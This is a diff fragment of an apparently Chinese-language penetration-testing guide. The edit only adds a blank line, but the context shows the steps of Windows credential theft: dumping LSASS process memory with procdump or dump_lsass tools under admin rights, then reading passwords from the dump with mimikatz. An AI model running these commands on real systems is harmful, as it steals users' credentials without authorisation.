@@ -14,6 +14,7 @@ procdump.exe -accepteula -ma lsass.exe lsass_dump
 或者使用dump_lsass_for_Win*_x64.exe转储（需要管理员权限）
 
 dump_lsass_for_Win7_x64.exe
+
 dump_lsass_for_Win10_x64.exe
 
 第2步：利用mimikatz读取密码，lsass_dump.dmp为保存dump数据的文件
